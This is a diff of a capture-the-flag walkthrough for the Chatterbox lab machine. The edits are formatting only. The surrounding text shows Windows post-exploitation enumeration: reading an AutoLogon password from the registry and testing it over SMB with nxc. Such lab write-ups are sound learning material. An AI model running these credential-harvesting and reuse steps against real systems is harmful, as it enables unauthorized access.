@@ -82,7 +82,7 @@ Parachat 5.5 - Directory Traversal                                              
 ----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Shellcodes: No Results
 ```
-searchsploit tells us we have some exploits for that, including one in Metasploit. Buuuuut... since I"m trying to avoid using metasploit, let's take a look at the python script.
+searchsploit tells us we have some exploits for that, including one in Metasploit. Buuuuut... since I'm trying to avoid using metasploit, let's take a look at the python script.
  I copy it from it's location to my tools folder (because I don't want to mess up the original) and open it nvim.  
 
 Immediately 3 things stand out:  
@@ -185,6 +185,7 @@ dir c:\users\alfred\desktop
 
 ## PrivEsc
 So now we are in the box, but who are we? Let's get some info:
+
 ```bash
 c:\Windows\system32>systeminfo                                                                                                                                                               
 systeminfo                                                                                                                                                                                   
@@ -199,6 +200,7 @@ Registered Owner:          Windows User
 [...SNIP...]
 ```
 Interesting info, but nothing really blowing my hair back... Let's see who we are and what we can do:
+
 ```bash
 C:\Windows\system32>whoami
 whoami
@@ -220,6 +222,7 @@ SeTimeZonePrivilege           Change the time zone                 Disabled
 ```
 
 Let's see how many users are on this box
+
 ```bash
 C:\Windows\Panther>net users
 net users
@@ -234,6 +237,7 @@ The command completed successfully.
 OK, so it's just us and the admin.. let's hunt for some credentials...
 
 aaaaaand we find a default password in the registry!
+
 ```bash
 C:\Windows\Panther>reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
@@ -270,6 +274,7 @@ HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon\AutoLog
 Now the question is, who's password is it?
 
 Let's find out!
+
 ```bash
 nxc smb 10.129.238.144 -u 'alfred' -p 'W[...SNIP...]' --shares
 SMB         10.129.238.144  445    CHATTERBOX       [*] Windows 7 / Server 2008 R2 Build 7601 x32 (name:CHATTERBOX) (domain:Chatterbox) (signing:False) (SMBv1:True) 
